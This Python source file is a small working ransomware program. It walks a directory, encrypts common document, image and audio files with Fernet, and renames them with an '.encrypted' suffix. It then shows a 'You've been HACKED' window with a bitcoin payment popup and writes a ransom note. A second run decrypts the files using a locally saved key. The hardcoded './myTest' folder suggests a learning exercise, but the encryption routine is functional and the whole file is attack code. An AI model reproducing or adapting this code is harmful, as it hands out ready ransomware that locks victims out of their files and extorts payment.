from fileinput import filename
import os
from cryptography.fernet import Fernet
from tkinter import *
from tkinter import ttk
from pathlib import Path

encExtensions = ["pdf", "txt", "mp3", "jpg", "pptx", "docx"]

#gets all file paths in a given directory
def getFilePaths(targetDir):
    regFilePaths = []
    encFilePaths = []
    encryptedFlag = 0
    for root, dirs, files in os.walk(targetDir, topdown=False):
        for name in files:
            nameSplit = name.rsplit('.', 1)
            if (len(nameSplit) > 1):
                ext = nameSplit[1]
                #if file is already encrypted then put it in encrypted list (used for decryption)
                if (ext == "encrypted"):
                    encFilePaths.append(os.path.join(root,name))
                    encryptedFlag = 1
                #if file has a valid extension then put it in regFilePaths list
                if (ext in encExtensions):
                    regFilePaths.append(os.path.join(root,name))
    return regFilePaths, encFilePaths, encryptedFlag


#Uses Fernet symmetric encryption to encrypt all files in "filePaths" list
def encrypt(filePaths):
    key = Fernet.generate_key()
    fernet = Fernet(key)
    toEncrypt = 0

    with open('key.key', 'wb+') as f:
       f.write(key)
       f.close()
    for curFile in filePaths:
        with open(curFile, 'rb+') as f:
            #if file is less than a gigabyte
            if (os.path.getsize(curFile) < 1073741824):
                toEncrypt = 1
                data = f.read()
                encrypted = fernet.encrypt(data)
                f.seek(0)
                f.write(encrypted)
                print(curFile)
                f.close
        #renaming file to end with ".encrypted"
        if (toEncrypt == 1):
            p = Path(curFile)
            p.rename(Path(p.parent, f"{p.stem}{p.suffix}.encrypted"))
            toEncrypt = 0


#decrypts all files in "filePaths" list     
def decrypt(filePaths):
    with open("key.key", 'rb') as f:
            key = f.read()
            print(key)
            f.close()
    fernet = Fernet(key)
    
    for curFile in filePaths:
        with open(curFile, 'rb+') as f:
            data = f.read()
            decrypted = fernet.decrypt(data)
            f.seek(0)
            f.write(decrypted)
            f.truncate()
            f.close
        #renaming file to original
        p = Path(curFile)
        print(p.rename(Path(p.parent, f"{p.stem}")))


def open_popup():
   top= Toplevel(win)
   top.geometry("750x250")
   top.title("Bitcoin address")
   Label(top, text= "Please send bitcoin to the address below.", font=('Mistral 18 bold')).place(x=150,y=80)


targetDir = "./myTest"
regFilePaths, encFilePaths, encryptedFlag = getFilePaths(targetDir)

if (encryptedFlag == 0):
    encrypt(regFilePaths)
    win = Tk()
    win.geometry("750x270")
    Label(win, text=" You've been HACKED. Press button below to see message.", font=('Helvetica 14 bold')).pack(pady=20)
    #Create a button in the main Window to open the popup
    ttk.Button(win, text= "Open", command= open_popup).pack()
    win.mainloop()
    f = open("ransom.txt", "w+")
    f.write("Ransom, Ransom")
    f.close()

elif (encryptedFlag == 1):
    decrypt(encFilePaths)

